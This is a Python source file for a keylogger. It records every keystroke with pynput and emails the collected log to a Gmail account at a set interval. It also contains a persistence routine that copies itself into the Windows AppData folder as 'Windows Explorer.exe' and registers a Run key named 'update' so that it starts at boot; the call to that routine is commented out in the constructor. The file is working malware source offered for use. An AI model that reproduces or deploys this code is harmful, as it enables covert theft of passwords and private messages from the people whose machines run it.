import os
import shutil
import smtplib
import subprocess
import sys
import pynput.keyboard
import threading
import base64

class Keylogger:
    def __init__(self, time_interval, email, password):
        # If you want to test this program in persistent mode, I recommend you do it in a VM
        #self.becomePersistent()
        self.log = ''
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ''
        self.log = self.log + current_key

    # Creates the file in a hard-to-find path and runs it every time the computer is turned on
    # In this case the given path is a Windows path. If you want to run it in Linux or Mac OS,
    # set the corresponding hard-to-find path to its OS
    def becomePersistent(self):
        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
        if not os.path.exists(fileLocation):
            shutil.copyfile(sys.executable, fileLocation)
            subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
    
    def send_email(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
    def report(self):
        if self.log != '':
            self.send_email(self.email, self.password, self.log)
            self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# 30 this indicates how many seconds the notification will be sent by
# mail, you can to change it :D 
keylogger = Keylogger(30, 'email', 'password')
keylogger.start()